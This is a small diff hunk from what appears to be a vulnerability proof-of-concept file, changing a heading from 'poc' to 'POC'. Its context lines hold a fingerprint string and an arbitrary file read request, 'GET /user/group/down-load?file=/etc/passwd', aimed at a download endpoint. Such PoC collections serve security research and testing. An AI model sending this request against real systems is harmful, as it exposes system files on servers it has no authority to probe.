@@ -8,7 +8,7 @@
 body="/js/lib/slimscroll.js"
 ```
 
-## poc
+## POC
 
 ```
 GET /user/group/down-load?file=/etc/passwd HTTP/2
